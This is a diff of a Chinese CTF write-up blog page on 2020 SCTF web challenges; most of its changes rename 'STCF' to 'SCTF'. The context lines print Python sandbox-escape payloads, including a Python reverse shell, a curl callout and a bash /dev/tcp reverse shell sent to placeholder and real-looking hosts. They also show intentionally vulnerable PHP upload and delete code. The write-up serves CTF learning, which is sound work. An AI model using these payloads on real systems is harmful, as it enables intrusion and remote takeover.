@@ -7,7 +7,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <title>
-    2020STCFWeb题目复现 |
+    2020SCTFWeb题目复现 |
     
     Mount4in</title>
   
@@ -32,7 +32,7 @@
   <section class="outer">
   
 
-<article id="post-2020STCFWeb题目复现" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+<article id="post-2020SCTFWeb题目复现" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
   
   <div class="article-inner">
     
@@ -40,7 +40,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      2020STCFWeb题目复现
+      2020SCTFWeb题目复现
     </h1>
   
   
@@ -53,7 +53,7 @@
 
     
       <div class="article-meta">
-        <a href="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-date">
+        <a href="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-date">
   <time datetime="2020-07-07T15:32:45.000Z" itemprop="datePublished">2020-07-07</time>
 </a>
         
@@ -78,7 +78,7 @@
 
       
         
-        <p>SCTF几道TCTF的Web题目复现</p>
+        <p>SCTF几道Web题目复现</p>
 <a id="more"></a>
 
 <h1 id="0x01-CloudDisk"><a href="#0x01-CloudDisk" class="headerlink" title="0x01 CloudDisk"></a>0x01 <strong>CloudDisk</strong></h1><p><a href="https://github.com/dlau/koa-body/issues/75" target="_blank" rel="noopener">https://github.com/dlau/koa-body/issues/75</a></p>
@@ -103,38 +103,38 @@
 <li><p>request.args   POST=/       </p>
 </li>
 </ul>
-<p><img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708100928461.png" alt="image-20200708100928461"></p>
+<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708100928461.png" alt="image-20200708100928461"></p>
 <p>访问/static/flag</p>
-<p><img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708100958032.png" alt="image-20200708100958032"></p>
+<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708100958032.png" alt="image-20200708100958032"></p>
 <blockquote>
 <p>另一种方法</p>
 </blockquote>
 <p>利用app.root_path[:1]取得/</p>
-<p><img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708103617752.png" alt="image-20200708103617752"></p>
+<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708103617752.png" alt="image-20200708103617752"></p>
 <h1 id="0x02-pysandbox2"><a href="#0x02-pysandbox2" class="headerlink" title="0x02 pysandbox2"></a>0x02 <strong>pysandbox2</strong></h1><blockquote>
 <p>Nepnep</p>
 </blockquote>
 <p>背景知识：</p>
 <p>builtins模块提供对Python的所有“内置”标识符的直接访问，里面包含python的内置函数。作为一个实现细节，大多数模块都将名称 <code>__builtins__</code> 作为其全局变量的一部分提供。 <code>__builtins__</code> 的值通常是这个模块或者这个模块的值 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#object.__dict__" target="_blank" rel="noopener"><code>__dict__</code></a> 属性。这一点在SSTI中用的比较多。</p>
-<p><img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708104304296.png" alt="image-20200708104304296"></p>
+<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708104304296.png" alt="image-20200708104304296"></p>
 <p>可以利用<code>__builtins__.__dict__[&#39;ord&#39;]=lambda args:42</code>重写ord()函数。</p>
 <blockquote>
 <p>lambda arguments : expression</p>
 <p>lambda*args:expression</p>
 </blockquote>
-<img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708103125255.png" alt="image-20200708103125255" style="zoom:200%;">
+<img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708103125255.png" alt="image-20200708103125255" style="zoom:200%;">
 
 <p>之后就可以绕过security的检测。</p>
-<img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708104958779.png" alt="image-20200708104958779" style="zoom:200%;">
+<img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708104958779.png" alt="image-20200708104958779" style="zoom:200%;">
 
 <p>然后就可以执行任意代码。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.ord&#x3D;lambda*args:42</span><br><span class="line"></span><br><span class="line">__import__(&quot;os&quot;).popen(&quot;curl  ip:8888&quot;)</span><br><span class="line"></span><br><span class="line">import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708110333343.png" alt="image-20200708110333343"></p>
+<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708110333343.png" alt="image-20200708110333343"></p>
 <p>还有另一种方法，可以将结果回显</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.view_functions[&#39;security&#39;]&#x3D;lambda: __import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708111330602.png" alt="image-20200708111330602"></p>
+<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708111330602.png" alt="image-20200708111330602"></p>
 <blockquote>
 <p><a href="http://www.l-team.org/archives/379.html" target="_blank" rel="noopener">L-team</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests </span><br><span class="line">print(requests.post(&#39;http:&#x2F;&#x2F;39.104.90.30:10005&#39;, data&#x3D;&#123;</span><br><span class="line">	&#39;cmd&#39;:</span><br><span class="line">    &#39;Flask.__doc__&#x3D;request.form[secret[0]];&#39;</span><br><span class="line">    &#39;app.make_response&#x3D;lambda*p:Flask.__doc__;&#39;</span><br><span class="line">    &#39;app.process_response&#x3D;exec&#39;,</span><br><span class="line">    &#39;F&#39;: &quot;__import__(&#39;os&#39;).system(\&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;my_ip&#x2F;23333 0&gt;&amp;1&#39;\&quot;)&quot; &#125;))</span><br></pre></td></tr></table></figure>
@@ -151,11 +151,11 @@
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#\App\Http\Controllers\IndexController.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span> &amp;&amp; strpos($_SERVER[<span class="string">"REMOTE_ADDR"</span>],<span class="string">"192.168."</span>) !== <span class="number">0</span> &amp;&amp; strpos($_SERVER[<span class="string">"REMOTE_ADDR"</span>],<span class="string">"10."</span>) !== <span class="number">0</span> )  &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"admin only"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>])))&#123;</span><br><span class="line">            mkdir(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rm</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($_POST[<span class="string">"filename"</span>], <span class="string">'../'</span>) !== <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">"???"</span>);</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]))&#123;</span><br><span class="line">                rmdir(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"rmdir"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                unlink(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"unlink"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strpos($_POST[<span class="string">"filename"</span>], <span class="string">'../'</span>) !== <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">"???"</span>);</span><br><span class="line">        file_put_contents(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">"/"</span>.$_POST[<span class="string">"filename"</span>],base64_decode($_POST[<span class="string">"content"</span>]));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">"/"</span>.$_POST[<span class="string">"filename"</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moveLog</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        $data =date(<span class="string">"Y-m-d"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data))&#123;</span><br><span class="line">            mkdir(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data);</span><br><span class="line">        &#125;</span><br><span class="line">        $opts = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'http'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'method'</span>=&gt;<span class="string">"GET"</span>,</span><br><span class="line">                <span class="string">'timeout'</span>=&gt;<span class="number">1</span>,<span class="comment">//单位秒</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $content = file_get_contents(<span class="string">"http://127.0.0.1/tmp/"</span>.md5(<span class="string">'127.0.0.1'</span>).<span class="string">"/"</span>.$filename,<span class="keyword">false</span>,stream_context_create($opts));</span><br><span class="line">        file_put_contents(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data.<span class="string">"/"</span>.$filename,$content);</span><br><span class="line">        <span class="keyword">echo</span> storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data.<span class="string">"/"</span>.$filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708174824735.png" alt="image-20200708174824735"></p>
+<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708174824735.png" alt="image-20200708174824735"></p>
 <p>任意文件读取，这里需要加上index.php。否则不会成功。</p>
-<p><img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708174534642.png" alt="image-20200708174534642"></p>
-<h1 id="0x05-Login-Me"><a href="#0x05-Login-Me" class="headerlink" title="0x05 Login Me"></a>0x05 Login Me</h1><p><img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708211540390.png" alt="image-20200708211540390"></p>
-<h1 id="0X06-Login-Me-Aagin"><a href="#0X06-Login-Me-Aagin" class="headerlink" title="0X06 Login Me Aagin"></a>0X06 Login Me Aagin</h1><p><img src="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708211553620.png" alt="image-20200708211553620"></p>
+<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708174534642.png" alt="image-20200708174534642"></p>
+<h1 id="0x05-Login-Me"><a href="#0x05-Login-Me" class="headerlink" title="0x05 Login Me"></a>0x05 Login Me</h1><p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708211540390.png" alt="image-20200708211540390"></p>
+<h1 id="0X06-Login-Me-Aagin"><a href="#0X06-Login-Me-Aagin" class="headerlink" title="0X06 Login Me Aagin"></a>0X06 Login Me Aagin</h1><p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708211553620.png" alt="image-20200708211553620"></p>
 
       
     </div>
@@ -169,7 +169,7 @@
           </li>
           <li class="post-copyright-link">
           <strong>文章链接:  </strong>
-          <a href="/2020/07/07/2020STCFWeb题目复现/" target="_blank" title="2020STCFWeb题目复现">http://mount4in.github.io/2020/07/07/2020STCFWeb题目复现/</a>
+          <a href="/2020/07/07/2020SCTFWeb题目复现/" target="_blank" title="2020SCTFWeb题目复现">http://mount4in.github.io/2020/07/07/2020SCTFWeb题目复现/</a>
           </li>
           <li class="post-copyright-license">
             <strong>版权声明:   </strong>
@@ -182,7 +182,7 @@
   
   <!---->
     <footer class="article-footer">
-      <a data-url="http://mount4in.github.io/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" data-id="ckdl5wa140000w8sh56kv77m0"
+      <a data-url="http://mount4in.github.io/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" data-id="ckdl664hc0001q4sh4fee73at"
          class="article-share-link">Share</a>
       
     </footer>
@@ -193,19 +193,19 @@
     
   <nav class="article-nav">
     
-      <a href="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+      <a href="/2020/07/07/2020STCFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
         <strong class="article-nav-caption">Newer</strong>
         <div class="article-nav-title">
           
-            2020天翼杯Web题目复现
+            2020STCFWeb题目复现
           
         </div>
       </a>
     
     
-      <a href="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+      <a href="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
         <strong class="article-nav-caption">Older</strong>
-        <div class="article-nav-title">2020SCTFWeb题目复现</div>
+        <div class="article-nav-title">2020 TCTF0CTF Web题目复现</div>
       </a>
     
   </nav>
